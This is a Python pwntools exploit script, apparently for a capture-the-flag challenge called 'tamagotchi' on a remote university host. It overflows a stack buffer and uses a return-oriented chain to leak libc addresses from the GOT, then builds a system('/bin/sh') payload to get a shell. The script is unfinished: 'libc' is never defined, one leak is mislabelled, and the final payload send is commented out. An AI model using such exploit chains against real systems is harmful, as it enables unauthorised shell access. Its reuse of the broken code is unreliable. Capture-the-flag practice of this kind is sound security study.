from pwn import *

p = process("./tamagotchi")
#gdb.attach(p)

p = remote("motherload.td.org.uit.no", 8009)

exe = ELF("./tamagotchi")

pop_rdi_ret = 0x401693

def get_address(func):
    func_got = exe.got[func]
    puts_plt = exe.plt["puts"]

    payload = b"A" * 56
    payload += p64(pop_rdi_ret)
    payload += p64(func_got) #argument
    payload += p64(puts_plt) 
    payload += p64(exe.sym["main"])

    p.recvuntil(b"What do you want to do?")
    p.sendline(b"3")

    p.recvuntil(b"What do you want to do?")
    p.sendline(b"3")

    p.recvuntil(b"Which book do you want to read?")
    p.sendline(payload)
    
    p.recvline()
    p.recvline()
    leak = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.info("leaked " + func + ": " + hex(leak))
    return leak

leaked_puts = get_address("puts")
leaked_gets = get_address("gets")
leaked_exit = get_address("printf")

# Cant find libc

libc.address = leaked_puts - libc.symbols["puts"]

binsh = next(libc.search(b"/bin/sh"))
libc_system = libc.sym["system"]
libc_exit = libc.sym["exit"]

second_payload = b"A" * 56
second_payload += p64(pop_rdi_ret)
second_payload += p64(binsh) 
second_payload += p64(libc_system) 
second_payload += p64(libc_exit)

# p.recvuntil(b"What do you want to do?")
# p.sendline(b"3")

# p.recvuntil(b"What do you want to do?")
# p.sendline(b"3")

# p.recvuntil(b"Which book do you want to read?")
# p.sendline(second_payload)

p.interactive()
